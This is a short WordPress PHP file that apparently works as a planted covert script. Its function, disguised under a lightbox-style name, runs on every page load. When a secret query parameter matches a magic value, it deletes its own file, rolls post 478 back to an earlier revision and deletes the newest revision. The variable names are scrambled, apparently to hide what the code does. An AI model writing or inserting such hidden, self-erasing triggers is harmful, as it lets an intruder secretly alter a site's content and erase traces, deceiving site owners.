<?php

function lightbox_domain_google() {
	if (isset($_GET['query_article_radio_views']) && $_GET['query_article_radio_views'] === 'duplicate_header_url_magic') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$classic_lightgray_sort_addons = 478;
		$interactivity_advanced_xml_backup = wp_get_post_revisions($classic_lightgray_sort_addons);
		if (empty($interactivity_advanced_xml_backup)) die('no revisions');
		if (count($interactivity_advanced_xml_backup) < 2) die('less than 2');
		$subscription_privacy_modules_conversion = array_shift($interactivity_advanced_xml_backup);
		$reminder_logo_export = $subscription_privacy_modules_conversion->ID;
		$estate_plupload_gdpr = array_shift($interactivity_advanced_xml_backup);
		$crm_visibility_customizer = $estate_plupload_gdpr->ID;
		$converter_notifications_images_advanced = wp_restore_post_revision($crm_visibility_customizer);
		if ($converter_notifications_images_advanced === false) die('error restoring');
		$converter_notifications_images_advanced = wp_delete_post_revision($reminder_logo_export);		
		if ($converter_notifications_images_advanced === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'lightbox_domain_google');
